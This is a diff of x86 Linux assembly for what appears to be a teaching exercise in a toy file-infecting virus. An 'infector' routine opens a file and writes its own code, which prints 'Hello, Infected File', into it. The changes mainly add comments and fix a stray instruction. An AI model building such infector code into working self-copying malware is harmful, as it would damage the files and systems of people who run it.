@@ -48,6 +48,7 @@ infector:
     push    ebp             ; Save caller state
     mov     ebp, esp
     sub     esp, 4          ; Leave space for local var on stack
+    ; we didn't really need to do this ^ because we don't use that space
     pushad
 
     open:
@@ -58,7 +59,7 @@ infector:
         int     0x80
 
     write:
-        push    eax         ; Top of stack is fd
+        push    eax         ; Push fd to stack so we could close the file in close (line 69)
         mov     ebx, eax    ; Set ebx to fd
         mov     eax, 4      ; Set eax to sys_write
         mov     ecx, code_start  ; Output buffer is code_start
@@ -66,8 +67,8 @@ infector:
         int     0x80
 
     close:
-        pop     ebx
-        mov     eax, 6
+        pop     ebx ; line 69
+        mov     eax, 6 ; close system call
         int     0x80
 
     popad
@@ -77,7 +78,7 @@ infector:
 
 code_start:
     msg:    db "Hello, Infected File",10, 0
-    len:    equ $-msg
+    len:    equ $-msg    ; set len to be current address ($) - msg address
 
 infection:
     push    ebp             ; Save caller state
@@ -85,7 +86,6 @@ infection:
     sub     esp, 4          ; Leave space for local var on stack
     mov eax, [ebp+8]
     and eax, 1
-    pop ebp
     jz evn               ;Jump on Even
     jnz code_end
     
@@ -98,4 +98,3 @@ infection:
         jmp    code_end
 
 code_end:
-    end:    db 'q'
